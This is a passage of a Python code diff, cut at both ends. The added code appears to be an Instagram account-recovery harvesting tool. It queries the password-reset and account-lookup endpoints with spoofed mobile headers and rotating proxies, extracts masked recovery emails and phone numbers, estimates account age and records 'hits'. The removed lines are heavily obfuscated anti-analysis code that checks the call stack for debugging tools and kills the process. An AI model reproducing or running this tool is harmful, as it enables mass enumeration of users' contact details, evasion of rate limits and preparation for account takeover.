+_HIT_PFP_DOWNLOAD_RETRIES = 6
+_HIT_PFP_REFRESH_ROUNDS = 4
+_HIT_POSTS_FETCH_RETRIES = 10
+_HIT_POSTS_FETCH_ROUNDS = 3
+_HIT_GRAPHQL_DOC_ID = "35299094813070532"
+_HIT_RECOVERY_WEB_URL = (
+    "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
+)
+_HIT_RECOVERY_RESET_URL = "https://www.instagram.com/accounts/password/reset/"
+_HIT_LOOKUP_MOBILE_APP_ID = "567067343352427"
+_HIT_LOOKUP_BLOKS_VERSION = (
+    "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+)
+_HIT_LOOKUP_PROFILE_URL = "https://i.instagram.com/api/v1/users/web_profile_info/"
+_HIT_LOOKUP_BLOKS_URL = (
+    "https://i.instagram.com/api/v1/bloks/async_action/"
+    "com.bloks.www.caa.ar.search.async/"
+)
+_HIT_LOOKUP_MOBILE_UA = (
+    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; "
+    "samsung; SM-A235F; a23; qcom; en_IN; 704872281)"
+)
+_HIT_LOOKUP_PHONE_RE = re.compile(r"\+\d{1,4}(?:\s\*+)+[\d* ]+\d{2}")
+_HIT_LOOKUP_EMAIL_RE = re.compile(
+    r"[a-zA-Z0-9][a-zA-Z0-9*._-]*\*+[a-zA-Z0-9*._-]*@[a-zA-Z0-9*._-]+\.[a-zA-Z]{2,}"
+)
+_HIT_LOOKUP_NO_ACCOUNT_RE = re.compile(
+    r"no account found|couldn.?t find|user not found|doesn.?t match",
+    re.IGNORECASE,
+)
+_HIT_PROFILE_MEDIA_EDGE_RE = re.compile(
+    r'"edge_owner_to_timeline_media"\s*:\s*\{\s*"count"\s*:\s*(\d+)',
+)
+_HIT_PROFILE_MEDIA_COUNT_RE = re.compile(r'"media_count"\s*:\s*(\d+)', re.I)
+_HIT_PROFILE_POSTS_COUNT_RE = re.compile(r'"posts_count"\s*:\s*(\d+)', re.I)
+_HIT_FULL_EMAIL_RE = re.compile(
+    r"^[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$",
+    re.IGNORECASE,
+)
+_HIT_FULL_GMAIL_RE = re.compile(
+    r"^[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@gmail\.com$",
+    re.IGNORECASE,
+)
+_HIT_BODY_EMAIL_RE = re.compile(
+    r"[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
+    re.IGNORECASE,
+)
+_HIT_BODY_GMAIL_RE = re.compile(
+    r"[a-zA-Z0-9][a-zA-Z0-9._-]{2,}@gmail\.com",
+    re.IGNORECASE,
+)
+_HIT_MASKED_GMAIL_RE = re.compile(r"@gmail\.com\s*$", re.IGNORECASE)
+_HIT_SENT_CODE_RE = re.compile(
+    r"sent a code to ([a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})",
+    re.IGNORECASE,
+)
+
+_hit_proxy_boot_logged = False
+_hits_file_lock = threading.Lock()
+HITS_DIR = "hits"
+_session_hits_file = None
+_next_worker_id = 0
+_worker_id_lock = threading.Lock()
+
+
+class HitRecoveryResult:
+    __slots__ = (
+        "query", "found", "username", "email", "phone",
+        "account_created", "contact_points", "error", "error_kind",
+    )
+
+    def __init__(
+        self,
+        query,
+        found=False,
+        username=None,
+        email=None,
+        phone=None,
+        account_created=None,
+        contact_points=None,
+        error=None,
+        error_kind=None,
+    ):
+        self.query = query
+        self.found = found
+        self.username = username
+        self.email = email
+        self.phone = phone
+        self.account_created = account_created
+        self.contact_points = contact_points or []
+        self.error = error
+        self.error_kind = error_kind
+
+
+def _estimate_join_year_from_user_id(user_id):
+    """Estimate account join year from Instagram numeric user id (pk)."""
+    try:
+        uid = int(user_id)
+    except (TypeError, ValueError):
+        return None
+    if uid <= 1:
+        return None
+    if uid < 1_279_000:
+        return "~2010"
+    if uid <= 17_750_000:
+        return "~2011"
+    if uid <= 279_760_000:
+        return "~2012"
+    if uid <= 900_990_000:
+        return "~2013"
+    if uid <= 1_629_010_000:
+        return "~2014"
+    if uid <= 2_369_359_761:
+        return "~2015"
+    if uid <= 4_239_516_754:
+        return "~2016"
+    if uid <= 6_345_108_209:
+        return "~2017"
+    if uid <= 10_016_232_395:
+        return "~2018"
+    if uid <= 27_238_602_159:
+        return "~2019"
+    if uid <= 43_464_475_395:
+        return "~2020"
+    if uid <= 50_289_297_647:
+        return "~2021"
+    if uid <= 57_464_707_082:
+        return "~2022"
+    if uid <= 63_313_426_938:
+        return "~2023"
+    return "~2024+"
+
+
+def _unescape_ig_json_string(value):
+    if not value:
+        return ""
+    try:
+        return json.loads(f'"{value}"')
     except Exception:
-        юАыЪГШГэЯШюгеез()
-    if not getattr(ЩАЇБшУЍТЭДДтЁАбиж,'lstrip')().startswith(getattr(фвсКРсяНЦРЩЧЯЎ,'lstrip')()):
-        юАыЪГШГэЯШюгеез()
-фУОЋПйпХаЙоУЖ()
-def грхЅбьщЙСНОщУХвЅЌ():
-    вЗщШКЎЌЙЂщдоУ='ЪйІЏъаМох'
-    try:
-        АгЬзИйЈлВбкЍЈФКНЛДІ=__import__(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1091, 1111, 1141, 1151, 1071, 1107, 1128])))
-        ШгЙЅчПЖЈАЖТцэЪ=__import__(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1093, 1098])))
-        ЦоМйаЩЙЉАщтЇФ=(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1102, 1116, 1125, 1149, 1075, 1088, 1128, 1121, 1056, 1092, 1114, 1140, 1142, 1082, 1092, 1145, 1114, 1131, 1114, 1088])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1119, 1111, 1141, 1147, 1071, 1113, 1138, 1121, 1065, 1099, 1088, 1123, 1149, 1124, 1088, 1125])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1096, 1099, 1123, 1134, 1057, 1135, 1151, 1110, 1060, 1094, 1109, 1123, 1121, 1069, 1109, 1074, 1102, 1084])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1114, 1116, 1123, 1123, 1045, 1116, 1149, 1095, 1056, 1112, 1047, 1142, 1142])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1103, 1089, 1138, 1149, 1067, 1107, 1128, 1121, 1065, 1099, 1088, 1123, 1149, 1124, 1088, 1125])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1091, 1111, 1122, 1130, 1082, 1109, 1138, 1114, 1056, 1092, 1101, 1113, 1145, 1067, 1093, 1136, 1098, 1050, 1103, 1089, 1138, 1149, 1067, 1107, 1128, 1040, 1077, 1107])))
-        ыЏЉжибЗЮмЊаВ=(''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1029, 1118, 1134, 1126, 1070, 1090, 1149, 1041])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1029, 1119, 1140, 1126, 1070, 1105, 1075])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1101, 1105, 1135, 1131, 1080, 1105, 1091])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1114, 1088, 1125, 1131, 1065])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1119, 1111, 1125, 1120, 1063, 1088, 1125, 1106, 1056])), ''.join(chr(ЋДшБиЏЂЍЁЮЗЋБЏыкщ^ord(вЗщШКЎЌЙЂщдоУ[ЕХАюПЁБЮЕжЩЃТ%len(вЗщШКЎЌЙЂщдоУ)])) for ЕХАюПЁБЮЕжЩЃТ,ЋДшБиЏЂЍЁЮЗЋБЏыкщ in enumerate([1102, 1116, 1125, 1120, 1063, 1088, 1125, 1106, 1056])))
-        for бБХЃХЧйПалБЍхРбЙ in АгЬзИйЈлВбкЍЈФКНЛДІ.stack():
-            ЮбчЖЖЫбюАЮНЎцФЂб=(getattr(бБХЃХЧйПалБЍхРбЙ,'filename')or '').lower()
-            ыЏАПБфвЧИЩХ=getattr(getattr(ШгЙЅчПЖЈАЖТцэЪ,'path'),'basename')(ЮбчЖЖЫбюАЮНЎцФЂб)
-            if ыЏАПБфвЧИЩХ in ЦоМйаЩЙЉАщтЇФ or any(ЋЖюРЦЁгпьГти in ЮбчЖЖЫбюАЮНЎцФЂб for ЋЖюРЦЁгпьГти in ыЏЉжибЗЮмЊаВ):
-                юАыЪГШГэЯШюгеез()
-    except Exception:pass
-грхЅбьщЙСНОщУХвЅЌ()
+        return value.replace("\\/", "/").replace('\\"', '"')
 
-def щФКИрКІЫЏУжйльЄг():
-    ймъЗЯвйбогы='ЕЯЩщЌРнДо'
-    ПЊрхИЌЅЫчюыЌ=__import__(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1127, 1102, 1095, 1069, 1123, 1101])))
-    ЈГюГюІЎпЪЭрЕІЊВ=__import__(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1121, 1094, 1092, 1068])))
-    ЊЮВЖьиЮакЇЮспК=__import__(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1126, 1110, 1114])))
-    ЋЖйлЬШчЙЅхаЯД=''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1105, 1098, 1119, 1068, 1120, 1103, 1101, 1133, 1115, 1127, 1039, 1118, 1064, 1122, 1108, 1102, 1076, 1098, 1146, 1039, 1088, 1063, 1130, 1103, 1103, 1145, 1054, 1132, 1088, 1116, 1129, 1144, 1096, 1116, 1120, 1054, 1132, 1088, 1116, 1129, 1133, 1106, 1112, 1076, 1097, 1136, 1102, 1090, 1129, 9240, 1024, 1092, 1147, 1099, 1077, 1095, 1096, 1087, 1129, 1024, 1105, 1137, 1101, 1126, 1039, 1099, 1083, 1133, 1097, 1107, 1076, 1117, 1136, 1091, 1093, 1082, 1058, 1086, 1129, 1148, 1111, 1126, 1039, 1113, 1064, 1135, 1099, 1112, 1126, 1054, 1142, 1088, 1114, 1085, 1151, 1024, 1104, 1147, 1100, 1136, 1039, 1099, 1083, 1133, 1097, 1107, 1076, 1117, 1136, 1091, 1093, 1082, 1068, 1108, 1109, 1141, 1104, 1077, 1110, 1094, 1084, 1068, 1096, 1116, 1122, 1115, 1083, 1073, 1136, 1062, 1145, 1024, 1104, 1149, 1101, 1126, 1098, 1101, 1129, 1144, 1096, 1112, 1076, 1101, 1150, 1094, 1093, 1061, 1151, 1036, 1053, 1151, 1111, 1137, 1099, 1094, 1127, 1042, 1134, 1106, 1076, 1107, 1140, 1089, 1095, 1063, 1122, 1102, 1053, 9216, 1054, 1125, 1114, 1117, 1129, 1144, 1096, 1112, 1076, 1110, 1136, 1111, 1033, 1068, 1128, 1097, 1097, 1147, 1100, 1077, 1099, 1094, 1086, 1122, 1038, 1059, 1104, 1147, 1091, 1130, 1125, 1030, 1116, 1145, 1144, 1094, 1054, 1126, 1102, 1104, 1082, 1078, 1024, 1114, 1147, 1054, 1145, 1098, 1096, 1083, 1122, 1024, 1133, 1133, 1098, 1149, 1088, 1095, 1129, 1130, 1097, 1103, 1127, 1098, 1081, 1039, 1117, 1057, 1129, 1102, 1053, 1143, 1105, 1144, 1098, 1033, 1067, 1133, 1091, 1110, 1082, 1056, 1100, 1088, 1116, 1083, 1068, 1127, 1109, 1149, 1114, 1127, 1102, 1033, 1071, 1123, 1100, 1113, 1137, 1100, 1077, 1100, 1096, 1061, 1120, 1093, 1113, 1076, 9258, 1077, 1094, 1117, 1134, 1151, 1024, 1112, 1145, 1116, 1140, 1117, 1115, 1064, 1151, 1107, 1112, 1136, 1054, 1139, 1088, 1115, 1129, 1141, 1103, 1096, 1082, 1056, 1107, 1117, 1088, 1069, 1133, 1024, 1106, 1146, 1054, 1132, 1088, 1116, 1083, 1068, 1104, 1109, 1147, 1104, 1136, 1039, 1118, 1062, 1122, 1031, 1097, 1076, 1101, 1140, 1113, 1100, 1129, 1144, 1096, 1108, 1127, 1054, 1125, 1098, 1115, 1082, 1123, 1102, 1116, 1144, 1111, 1121, 1110, 1031, 1111, 1109, 1103, 1096, 1076, 1101, 1121, 1117, 1088, 1081, 1148, 1093, 1113, 1076, 1098, 1149, 1098, 1033, 1057, 1129, 1089, 1113, 1137, 1100, 1077, 1091, 1088, 1058, 1129, 1024, 1092, 1147, 1099, 1077, 1116, 1117, 1083, 1125, 1104, 1053, 1136, 1111, 1138, 1089, 1088, 1085, 1141, 1038, 1059, 1094, 1115, 1123, 1098, 1115, 1082, 1129, 1024, 1098, 1148, 1119, 1121, 1040, 1033, 1040, 1123, 1109, 1053, 1143, 1119, 1147, 1032, 1117, 1129, 1129, 1110, 1112, 1146, 1054, 1139, 1088, 1115, 1086, 1133, 1106, 1113, 1082, 1056, 1113, 1098, 1114, 1082, 1068, 1100, 1106, 1139, 1111, 1142, 1027, 1033, 1060, 1123, 1106, 1112, 1076, 1117, 1146, 1119, 1088, 1084, 1121, 1024, 9257, 1076, 1117, 1145, 1102, 1114, 1082, 1125, 1091, 1043, 1034, 1130, 1140, 1090, 1113, 1068, 1150, 1024, 1113, 1137, 1098, 1136, 1100, 1117, 1068, 1128, 1038, 1053, 1105, 1113, 1146, 1039, 1101, 1068, 1120, 1093, 1097, 1137, 1114, 1083, 1073, 1149, 1057, 1125, 1107, 1053, 1127, 1117, 1127, 1094, 1113, 1085, 1068, 1097, 1102, 1076, 1102, 1127, 1088, 1117, 1068, 1135, 1108, 1112, 1136, 1054, 1143, 1110, 1033, 1033, 1096, 1093, 1099, 1137, 1106, 1146, 1119, 1104, 1068, 1150, 1024, 9257, 1076, 1095, 1146, 1114, 1038, 1083, 1129, 1024, 1107, 1147, 1098, 1083, 1073, 1120, 1063, 1130, 1097, 1107, 1149, 1098, 1136, 1039, 1093, 1062, 1123, 1104, 1053, 1121, 1104, 1145, 1088, 1098, 1058, 1129, 1092, 1031, 1076, 1119, 1142, 1095, 1088, 1068, 1146, 1093, 1104, 1137, 1104, 1121, 1039, 1038, 1050, 1135, 1106, 1108, 1124, 1098, 1077, 1124, 1088, 1069, 1128, 1097, 1112, 1075, 1040, 1035, 1142, 1094, 1084, 1150, 1024, 1148, 1095, 1130, 1077, 1112, 1096, 1061, 1127, 1024, 1109, 1141, 1101, 1077, 1115, 1089, 1068, 1068, 1093, 1107, 1137, 1100, 1138, 1110, 1033, 1062, 1130, 1024, 1116, 1076, 1106, 1146, 1116, 1117, 1129, 1144, 1103, 1096, 1126, 1111, 1126, 1115, 1031, 1111, 1102, 1089, 1102, 1137, 1030, 1056, 1039, 1088, 1082, 1122, 1031, 1097, 1076, 1119, 1077, 1119, 1100, 1083, 1151, 1103, 1107, 1141, 1106, 1148, 1115, 1104, 1129, 1144, 1106, 1116, 1149, 1098, 1083, 1073, 1137, 1030, 1118, 1024, 1108, 1127, 1104, 1074, 1115, 1033, 1057, 1133, 1106, 1113, 1076, 9258, 1077, 1110, 1094, 1084, 1150, 1024, 1105, 1149, 1112, 1136, 1039, 1098, 1057, 1123, 1097, 1118, 1137, 1101, 1077, 1102, 1115, 1068, 1058, 1086, 1133, 1137, 1115, 1145, 1039, 1094, 1063, 1129, 1024, 1105, 1141, 1095, 1136, 1117, 1029, 1129, 1135, 1106, 1092, 1076, 1112, 1146, 1117, 1033, 1082, 1125, 1112, 1053, 1145, 1105, 1127, 1098, 1031, 1111, 1109, 1103, 1096, 1076, 1097, 1140, 1089, 1117, 1068, 1128, 1024, 1102, 1147, 1099, 1127, 1100, 1100, 1129, 9240, 1024, 1109, 1137, 1100, 1136, 1032, 1114, 1129, 1125, 1102, 1115, 1149, 1104, 1148, 1115, 1100, 1129, 1148, 1106, 1108, 1146, 1098, 1126, 1039, 1088, 1063, 1151, 1108, 1112, 1141, 1114, 1083, 1073, 1131, 1083, 1133, 1097, 1107, 1076, 1117, 1136, 1091, 1093, 1082, 1078, 1024, 1033, 1060, 1034, 1077, 1121, 1094, 1085, 1068, 1126, 1106, 1121, 1104, 1137, 1025, 1079, 1037, 1129, 1110, 1112, 1144, 1105, 1125, 1110, 1100, 1083, 1068, 1097, 1102, 1076, 1104, 1146, 1115, 1033, 1050, 1112, 1125, 1140, 1114, 1054, 9217, 1039, 1104, 1062, 1145, 1031, 1103, 1137, 1054, 1126, 1115, 1088, 1061, 1120, 1024, 1119, 1147, 1098, 1149, 1039, 1093, 1062, 1151, 1097, 1107, 1139, 1040, 1035, 1144, 1100, 1064, 1127, 1024, 1116, 1120, 1098, 1136, 1090, 1113, 1085, 1058, 1024, 1134, 1120, 1100, 1146, 1089, 1102, 1068, 1150, 1024, 1118, 1147, 1112, 1139, 1098, 1100, 1129, 1150, 1093, 1118, 1147, 1107, 1144, 1098, 1095, 1069, 1129, 1092, 1043, 1034, 1130, 1149, 1098, 1033, 1062, 1122, 1100, 1092, 1076, 1098, 1149, 1094, 1095, 1070, 1068, 1113, 1106, 1121, 1054, 1137, 1098, 1098, 1083, 1141, 1104, 1097, 1137, 1114, 1077, 1094, 1114, 1129, 1121, 1113, 1053, 1124, 1119, 1121, 1094, 1100, 1063, 1135, 1093, 1043, 1034, 1141, 1136, 1098, 1113, 1129, 1131, 1103, 1108, 1146, 1113, 1077, 9275, 1033, 1085, 1124, 1093, 1053, 1144, 1105, 1146, 1119, 1033, 1061, 1123, 1110, 1112, 1127, 1054, 1142, 1088, 1092, 1081, 1133, 1102, 1092, 1082, 1056, 1117, 1088, 1095, 1068, 1151, 1108, 1053, 1141, 1099, 1137, 1094, 1117, 1139, 1068, 1113, 1106, 1121, 1054, 1145, 1088, 1114, 1068, 1058, 1024, 1134, 1141, 1096, 1140, 1096, 1100, 1129, 1133, 1109, 1113, 1149, 1098, 1071, 1039, 1104, 1062, 1145, 1024, 1107, 1137, 1096, 1136, 1117, 1033, 1057, 1133, 1092, 1053, 1141, 1054, 1142, 1095, 1096, 1063, 1135, 1093, 1043, 1034, 1149, 1146, 1089, 1117, 1064, 1135, 1108, 1053, 1108, 1146, 1136, 1113, 1100, 1061, 1123, 1104, 1092, 1137, 1100, 1077, 1112, 1089, 1068, 1122, 1024, 1092, 1147, 1099, 1077, 1096, 1115, 1062, 1147, 1024, 1116, 1076, 1101, 1150, 1094, 1093, 1061, 1068, 1108, 1103, 1137, 1115, 1083]))
-    гдВиюЃЌХГхйо=tuple(ЋЖйлЬШчЙЅхаЯД.split('\x1e'))
-    while (1):
-        ЬСмззэзцнІшяЭГХЈж=ПЊрхИЌЅЫчюыЌ.choice(гдВиюЃЌХГхйо)
-        print(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1105, 1130, 1151, 1036, 1088, 1135, 1133, 1101, 1147, 1095, 1039, 1146, 1032, 1109, 1139])));print(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1077, 1039, 1033, 1046, 1107, 1151, 1122, 1099, 1121, 1098, 1136, 1142, 1046, 1107, 1151, 1122, 1099, 1121, 1098, 1136, 1142, 1046, 1107, 1151, 1122, 1099, 1121])));print(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1214]))+ЬСмззэзцнІшяЭГХЈж+''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1198])));print(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1109, 1131, 1100, 1087, 1129, 1100, 1106, 1124, 1095, 1136, 1117])));print(''.join(chr(одДмхкШЁМмОЫоЌОтЭМ^ord(ймъЗЯвйбогы[яБЉЃВГЩЪРЭсЂрхаЎЉЈ%len(ймъЗЯвйбогы)])) for яБЉЃВГЩЪРЭсЂрхаЎЉЈ,одДмхкШЁМмОЫоЌОтЭМ in enumerate([1098, 1136, 1142, 1046, 1107, 1151, 1122, 1099, 1121, 1098, 1136, 1142, 1046, 1107, 1151, 1122, 1099, 1121, 1098, 1136, 1142, 1046, 1107, 1151, 1122, 1099, 1121, 1098])))
-        ЈГюГюІЎпЪЭрЕІЊВ.sleep(0.35);ЊЮВЖьиЮакЇЮспК.stdout.flush()
-_65a22ae481 = bytes([26, 80, 45, 207, 17, 94, 104, 188, 40, 159, 38, 218, 240, 67, 134, 235])
-_8bd4918204 = (
-        bytes([60, 204, 160, 191, 129, 111, 72, 177, 188, 184]),
-        bytes([80, 1, 184, 24, 216, 193, 178, 52, 47, 148]),
-        bytes([98, 133, 63, 189, 129, 173, 72, 128, 226, 67]),
-        bytes([248, 74, 72, 70, 9, 83, 225, 245, 51, 146])
+
+def _is_valid_ig_recovery_phone(value):
+    """Only IG-masked recovery phones — never raw digit strings."""
+    v = (value or "").strip()
+    if not v or not v.startswith("+"):
+        return False
+    if "*" not in v and "•" not in v:
+        return False
+    return bool(_HIT_LOOKUP_PHONE_RE.search(v))
+
+
+def _is_valid_ig_recovery_email(value):
+    v = (value or "").strip().lower()
+    if not v or "@" not in v:
+        return False
+    if "*" in v or "•" in v:
+        return bool(_HIT_LOOKUP_EMAIL_RE.search(v))
+    return bool(_HIT_FULL_EMAIL_RE.match(v))
+
+
+def _filter_valid_contact_points(points):
+    out = []
+    for cp in points or []:
+        if not isinstance(cp, dict):
+            continue
+        kind = (cp.get("type") or "").upper()
+        val = (cp.get("contact_point") or cp.get("value") or "").strip()
+        if not val:
+            continue
+        if kind == "EMAIL" and not _is_valid_ig_recovery_email(val):
+            continue
+        if kind == "PHONE" and not _is_valid_ig_recovery_phone(val):
+            continue
+        out.append({"type": kind, "contact_point": val})
+    return out
+
+
+def _extract_json_contact_points(body):
+    """Parse embedded contact_points from bloks / graphql JSON blobs."""
+    if not body:
+        return []
+    points = []
+    seen = set()
+    patterns = (
+        re.compile(
+            r'"type"\s*:\s*"(EMAIL|PHONE)"\s*,\s*"contact_point"\s*:\s*"((?:\\.|[^"\\])*)"',
+            re.IGNORECASE,
+        ),
+        re.compile(
+            r'"contact_point"\s*:\s*"((?:\\.|[^"\\])*)"\s*,\s*"type"\s*:\s*"(EMAIL|PHONE)"',
+            re.IGNORECASE,
+        ),
+    )
+    for pat in patterns:
+        for match in pat.finditer(body):
+            if pat is patterns[0]:
+                kind, raw_val = match.group(1), match.group(2)
+            else:
+                raw_val, kind = match.group(1), match.group(2)
+            val = _unescape_ig_json_string(raw_val).strip()
+            kind = (kind or "").upper()
+            if not val or kind not in {"EMAIL", "PHONE"}:
+                continue
+            key = (kind, val)
+            if key in seen:
+                continue
+            seen.add(key)
+            points.append({"type": kind, "contact_point": val})
+    return points
+
+
+def _hit_result_from_contact_points(query, contact_points):
+    points = _filter_valid_contact_points(contact_points)
+    email, phone = _pick_ig_contact_points(points)
+    if not (email or phone):
+        return None
+    return HitRecoveryResult(
+        query=query,
+        found=True,
+        username=query,
+        email=email or None,
+        phone=phone or None,
+        contact_points=points,
+    )
+
+
+def _recovery_error_retryable(result):
+    kind = getattr(result, "error_kind", None)
+    if kind == "not_found":
+        return False
+    if kind == "no_contact":
+        return True
+    return kind in (
+        "rate_limited", "server", "network", "bootstrap", "upstream", "http_error",
+    )
+
+
+def _recovery_proxy_bad(result):
+    """Drop proxy from pool on transport/upstream failures."""
+    kind = getattr(result, "error_kind", None)
+    return kind in ("network", "upstream", "bootstrap", "http_error")
+
+
+def _bootstrap_ig_recovery_web_session(sess, proxies=None):
+    """Fresh IG web session for password-reset search (rotating proxy)."""
+    ua = (
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+    )
+    try:
+        resp = sess.get(
+            _HIT_RECOVERY_RESET_URL,
+            headers={"User-Agent": ua, "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8"},
+            timeout=15,
+            proxies=proxies,
+        )
+    except requests.RequestException:
+        return "", ""
+    html = resp.text or ""
+    lsd_m = re.search(r'"LSD",\[\],\{"token":"([^"]+)"', html)
+    lsd = (lsd_m.group(1) if lsd_m else "").strip()
+    csrftoken = (sess.cookies.get("csrftoken") or "").strip()
+    did_m = re.search(r'"device_id":"([^"]+)"', html)
+    if did_m and not sess.cookies.get("ig_did"):
+        sess.cookies.set("ig_did", did_m.group(1), domain=".instagram.com")
+    if not sess.cookies.get("datr"):
